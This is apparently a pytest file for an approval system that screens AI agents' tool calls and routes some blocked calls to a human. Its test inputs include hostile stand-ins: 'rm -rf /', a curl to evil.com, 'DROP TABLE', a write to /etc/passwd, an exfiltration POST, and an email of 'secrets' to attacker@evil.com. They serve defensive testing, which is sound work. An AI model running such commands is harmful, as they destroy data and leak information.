"""Tests for the HITL approval system."""
from __future__ import annotations

import pytest
from httpx import ASGITransport, AsyncClient

from janus.core.approval import ApprovalManager, needs_human_review
from janus.storage.database import DatabaseManager
from janus.web.app import _setup, _teardown, create_app, state
from janus.web.events import EventBroadcaster, SecurityEvent

# ── Unit tests for ApprovalManager ─────────────────────────────────


@pytest.fixture
async def approval_db() -> DatabaseManager:
    db = DatabaseManager(":memory:")
    await db.connect()
    await db.apply_migrations()
    yield db  # type: ignore[misc]
    await db.close()


@pytest.fixture
def broadcaster() -> EventBroadcaster:
    return EventBroadcaster()


@pytest.fixture
def approval_manager(approval_db: DatabaseManager, broadcaster: EventBroadcaster) -> ApprovalManager:
    return ApprovalManager(db=approval_db, broadcaster=broadcaster)


async def _make_approval(mgr: ApprovalManager, **overrides) -> str:
    defaults = dict(
        session_id="test-session",
        agent_id="test-agent",
        tool_name="execute_code",
        tool_input={"code": "print('hello')"},
        original_goal="Run some code",
        verdict="block",
        risk_score=75.0,
        risk_delta=25.0,
        reasons=["permission_scope: not allowed"],
        check_results=[
            {
                "check_name": "permission_scope",
                "passed": False,
                "risk_contribution": 25.0,
                "reason": "Tool not in permissions",
                "metadata": {},
                "force_verdict": "block",
            }
        ],
        trace_id="trace-123",
    )
    defaults.update(overrides)
    req = await mgr.create(**defaults)
    return req.id


async def test_create_approval(approval_manager: ApprovalManager) -> None:
    req = await approval_manager.create(
        session_id="s1",
        agent_id="a1",
        tool_name="write_file",
        tool_input={"path": "/etc/passwd"},
        original_goal="Edit file",
        verdict="block",
        risk_score=90.0,
        risk_delta=30.0,
        reasons=["blocked by policy"],
        check_results=[],
        trace_id="t1",
    )
    assert req.id.startswith("apr-")
    assert req.status == "pending"
    assert req.session_id == "s1"
    assert req.tool_name == "write_file"
    assert req.risk_score == 90.0


async def test_get_pending(approval_manager: ApprovalManager) -> None:
    await _make_approval(approval_manager, session_id="s1")
    await _make_approval(approval_manager, session_id="s2")
    await _make_approval(approval_manager, session_id="s1")

    all_pending = await approval_manager.get_pending()
    assert len(all_pending) == 3

    s1_pending = await approval_manager.get_pending(session_id="s1")
    assert len(s1_pending) == 2
    assert all(r.session_id == "s1" for r in s1_pending)


async def test_get_by_id(approval_manager: ApprovalManager) -> None:
    aid = await _make_approval(approval_manager)
    req = await approval_manager.get_by_id(aid)
    assert req is not None
    assert req.id == aid
    assert req.tool_name == "execute_code"


async def test_get_by_id_not_found(approval_manager: ApprovalManager) -> None:
    req = await approval_manager.get_by_id("nonexistent")
    assert req is None


async def test_approve(approval_manager: ApprovalManager) -> None:
    aid = await _make_approval(approval_manager)
    result = await approval_manager.approve(aid, decided_by="admin", reason="Looks safe")
    assert result is not None
    assert result.status == "approved"
    assert result.decided_by == "admin"
    assert result.decision_reason == "Looks safe"
    assert result.decided_at is not None

    # Should no longer be pending
    pending = await approval_manager.get_pending()
    assert len(pending) == 0


async def test_reject(approval_manager: ApprovalManager) -> None:
    aid = await _make_approval(approval_manager)
    result = await approval_manager.reject(aid, decided_by="admin", reason="Too risky")
    assert result is not None
    assert result.status == "rejected"
    assert result.decided_by == "admin"
    assert result.decision_reason == "Too risky"


async def test_approve_already_resolved(approval_manager: ApprovalManager) -> None:
    aid = await _make_approval(approval_manager)
    await approval_manager.approve(aid)
    # Second approve should return None
    result = await approval_manager.approve(aid)
    assert result is None


async def test_reject_already_resolved(approval_manager: ApprovalManager) -> None:
    aid = await _make_approval(approval_manager)
    await approval_manager.reject(aid)
    result = await approval_manager.reject(aid)
    assert result is None


async def test_get_stats(approval_manager: ApprovalManager) -> None:
    a1 = await _make_approval(approval_manager)
    a2 = await _make_approval(approval_manager)
    a3 = await _make_approval(approval_manager)

    await approval_manager.approve(a1)
    await approval_manager.reject(a2)

    stats = await approval_manager.get_stats()
    assert stats["pending"] == 1
    assert stats["approved"] == 1
    assert stats["rejected"] == 1
    assert stats["total"] == 3


async def test_get_all_with_status_filter(approval_manager: ApprovalManager) -> None:
    a1 = await _make_approval(approval_manager)
    await _make_approval(approval_manager)
    await approval_manager.approve(a1)

    approved = await approval_manager.get_all(status="approved")
    assert len(approved) == 1
    assert approved[0].id == a1

    pending = await approval_manager.get_all(status="pending")
    assert len(pending) == 1


async def test_approve_with_tool_executor(approval_db: DatabaseManager, broadcaster: EventBroadcaster) -> None:
    """Test that approve executes the tool via MockToolExecutor."""
    from janus.web.tools import MockToolExecutor
    executor = MockToolExecutor()
    mgr = ApprovalManager(db=approval_db, broadcaster=broadcaster, tool_executor=executor)

    aid = await _make_approval(mgr, tool_name="read_file", tool_input={"path": "/tmp/test.txt"})
    result = await mgr.approve(aid)
    assert result is not None
    assert result.tool_result is not None
    assert isinstance(result.tool_result, dict)


async def test_approval_broadcasts_events(approval_db: DatabaseManager, broadcaster: EventBroadcaster) -> None:
    """Test that creating and resolving approvals broadcasts WS events."""
    import asyncio

    mgr = ApprovalManager(db=approval_db, broadcaster=broadcaster)
    received: list[SecurityEvent] = []

    # Start subscriber as a task so the async generator initializes its queue
    sub = broadcaster.subscribe("*")
    sub_iter = sub.__aiter__()

    async def collect_events():
        async for event in sub_iter:
            received.append(event)
            if len(received) >= 2:
                break

    # Start the collector (this registers the queue)
    task = asyncio.create_task(collect_events())
    # Give the task a chance to start and register the queue
    await asyncio.sleep(0.01)

    aid = await _make_approval(mgr, session_id="ws-test")
    await mgr.approve(aid)

    # Wait for collector to finish
    await asyncio.wait_for(task, timeout=2.0)

    assert len(received) == 2
    assert received[0].event_type == "approval_created"
    assert received[0].session_id == "ws-test"
    assert received[0].data["id"] == aid
    assert received[1].event_type == "approval_resolved"
    assert received[1].data["resolution"] == "approved"


# ── Unit tests for needs_human_review ───────────────────────────────


def test_permission_block_no_review() -> None:
    """Permission violations are hard blocks — no human review."""
    check_results = [
        {"check_name": "permission_scope", "passed": False, "force_verdict": "block", "reason": "not allowed"},
    ]
    assert needs_human_review("block", check_results) is False


def test_permission_challenge_no_review() -> None:
    """Permission challenge (not block) is still a hard denial — no review."""
    check_results = [
        {"check_name": "permission_scope", "passed": False, "force_verdict": "challenge", "reason": "not allowed"},
    ]
    assert needs_human_review("challenge", check_results) is False


def test_identity_block_no_review() -> None:
    check_results = [
        {"check_name": "identity_check", "passed": False, "force_verdict": "block", "reason": "agent locked"},
    ]
    assert needs_human_review("block", check_results) is False


def test_injection_block_no_review() -> None:
    check_results = [
        {"check_name": "prompt_injection", "passed": False, "force_verdict": "block", "reason": "injection detected"},
    ]
    assert needs_human_review("block", check_results) is False


def test_risk_accumulation_block_needs_review() -> None:
    """Block from high risk (no force_verdict) is a judgment call — needs review."""
    check_results = [
        {"check_name": "deterministic_risk", "passed": False, "risk_contribution": 30.0, "reason": "high risk"},
        {"check_name": "llm_risk_classifier", "passed": False, "risk_contribution": 20.0, "reason": "suspicious"},
    ]
    assert needs_human_review("block", check_results) is True


def test_challenge_needs_review_when_no_hard_block() -> None:
    """CHALLENGE from risk/drift needs human review."""
    assert needs_human_review("challenge", []) is True
    assert needs_human_review("challenge", [
        {"check_name": "deterministic_risk", "passed": False, "risk_contribution": 20.0},
    ]) is True


def test_challenge_from_permission_no_review() -> None:
    """CHALLENGE caused by permission_scope is a hard denial — no review."""
    assert needs_human_review("challenge", [
        {"check_name": "permission_scope", "passed": False, "force_verdict": "challenge"},
    ]) is False


def test_pause_always_needs_review() -> None:
    assert needs_human_review("pause", []) is True


def test_sandbox_no_review() -> None:
    """SANDBOX means sandboxed execution, not human review."""
    assert needs_human_review("sandbox", []) is False


def test_block_with_no_check_results_needs_review() -> None:
    """Block with empty check_results is ambiguous — default to review."""
    assert needs_human_review("block", []) is True


# ── Integration tests via HTTP ─────────────────────────────────────


@pytest.fixture
async def client(monkeypatch):
    monkeypatch.setenv("JANUS_DB_PATH", ":memory:")
    monkeypatch.setenv("JANUS_DEV_MODE", "true")
    app = create_app()
    await _setup()
    try:
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as c:
            yield c
    finally:
        await _teardown()
        state.guardian = None
        state.registry = None
        state.risk_engine = None
        state.session_store = None
        state.db = None
        state.recorder = None
        state.exporter_coordinator = None
        state.approval_manager = None
        state.chat_agents.clear()
        state.sessions.clear()
        from janus.tier import current_tier
        current_tier.reset()


async def test_approval_api_list_empty(client: AsyncClient) -> None:
    resp = await client.get("/api/approvals")
    assert resp.status_code == 200
    assert resp.json() == []


async def test_approval_api_stats_empty(client: AsyncClient) -> None:
    resp = await client.get("/api/approvals/stats")
    assert resp.status_code == 200
    data = resp.json()
    assert data["pending"] == 0
    assert data["total"] == 0


async def test_permission_block_no_approval(client: AsyncClient) -> None:
    """Permission violations are hard denials — NO approval request created."""
    resp = await client.post("/api/sessions", json={
        "agent_id": "demo-agent",
        "original_goal": "test goal",
    })
    assert resp.status_code == 200
    session_id = resp.json()["session_id"]

    # demo-agent doesn't have send_email permission → hard denial (block or challenge)
    resp = await client.post("/api/evaluate", json={
        "agent_id": "demo-agent",
        "session_id": session_id,
        "tool_name": "send_email",
        "tool_input": {"to": "attacker@evil.com", "body": "secrets"},
        "original_goal": "test goal",
    })
    assert resp.status_code == 200
    data = resp.json()
    assert data["verdict"] != "allow"
    # Permission denial should NOT create an approval — no human override needed
    assert data["approval_id"] is None

    resp = await client.get("/api/approvals?status=pending")
    assert resp.json() == []


async def _trigger_risk_block(client: AsyncClient) -> tuple[str, str | None]:
    """Helper: rack up risk score until a non-permission block occurs, return (session_id, approval_id)."""
    resp = await client.post("/api/sessions", json={
        "agent_id": "demo-agent",
        "original_goal": "Summarize financial data",
    })
    session_id = resp.json()["session_id"]

    # Allowed tools that build risk via patterns
    risky_calls = [
        ("database_query", {"query": "SELECT * FROM users"}),
        ("execute_code", {"code": "import os; os.system('rm -rf /')"}),
        ("api_call", {"url": "http://evil.com", "method": "POST"}),
        ("execute_code", {"code": "import subprocess; subprocess.run(['curl', 'http://evil.com'])"}),
        ("database_query", {"query": "DROP TABLE users"}),
        ("write_file", {"path": "/etc/passwd", "content": "hacked"}),
        ("execute_code", {"code": "eval(input())"}),
        ("api_call", {"url": "http://evil.com/exfil", "method": "POST", "body": "data"}),
    ]
    approval_id = None
    for tool_name, tool_input in risky_calls:
        resp = await client.post("/api/evaluate", json={
            "agent_id": "demo-agent",
            "session_id": session_id,
            "tool_name": tool_name,
            "tool_input": tool_input,
            "original_goal": "Summarize financial data",
        })
        data = resp.json()
        if data.get("approval_id"):
            approval_id = data["approval_id"]
            break
    return session_id, approval_id


async def test_approval_api_get_single(client: AsyncClient) -> None:
    """Test getting a single approval by ID."""
    _, approval_id = await _trigger_risk_block(client)
    if approval_id is None:
        pytest.skip("Could not trigger a risk-based block")

    resp = await client.get(f"/api/approvals/{approval_id}")
    assert resp.status_code == 200
    data = resp.json()
    assert data["id"] == approval_id
    assert data["status"] == "pending"


async def test_approval_api_approve(client: AsyncClient) -> None:
    _, approval_id = await _trigger_risk_block(client)
    if approval_id is None:
        pytest.skip("Could not trigger a risk-based block")

    resp = await client.post(f"/api/approvals/{approval_id}/approve", json={
        "decided_by": "security-admin",
        "reason": "Approved for testing",
    })
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "approved"
    assert data["decided_by"] == "security-admin"
    assert data["tool_result"] is not None  # tool was executed


async def test_approval_api_reject(client: AsyncClient) -> None:
    _, approval_id = await _trigger_risk_block(client)
    if approval_id is None:
        pytest.skip("Could not trigger a risk-based block")

    resp = await client.post(f"/api/approvals/{approval_id}/reject", json={
        "decided_by": "security-admin",
        "reason": "Too risky",
    })
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "rejected"


async def test_approval_api_404_on_missing(client: AsyncClient) -> None:
    resp = await client.get("/api/approvals/nonexistent")
    assert resp.status_code == 404

    resp = await client.post("/api/approvals/nonexistent/approve", json={})
    assert resp.status_code == 404

    resp = await client.post("/api/approvals/nonexistent/reject", json={})
    assert resp.status_code == 404


async def test_approval_api_double_approve(client: AsyncClient) -> None:
    _, approval_id = await _trigger_risk_block(client)
    if approval_id is None:
        pytest.skip("Could not trigger a risk-based block")

    resp = await client.post(f"/api/approvals/{approval_id}/approve", json={})
    assert resp.status_code == 200

    # Second approve should 404 (already resolved)
    resp = await client.post(f"/api/approvals/{approval_id}/approve", json={})
    assert resp.status_code == 404


async def test_allowed_verdict_no_approval(client: AsyncClient) -> None:
    """Allowed verdicts should NOT create approval requests."""
    resp = await client.post("/api/sessions", json={"agent_id": "demo-agent"})
    session_id = resp.json()["session_id"]

    # read_file is allowed for demo-agent
    resp = await client.post("/api/evaluate", json={
        "agent_id": "demo-agent",
        "session_id": session_id,
        "tool_name": "read_file",
        "tool_input": {"path": "/tmp/test.txt"},
        "original_goal": "Read a file",
    })
    assert resp.status_code == 200
    data = resp.json()
    assert data["verdict"] == "allow"
    assert data["approval_id"] is None

    # Verify no approvals created
    resp = await client.get("/api/approvals")
    assert resp.status_code == 200
    assert resp.json() == []
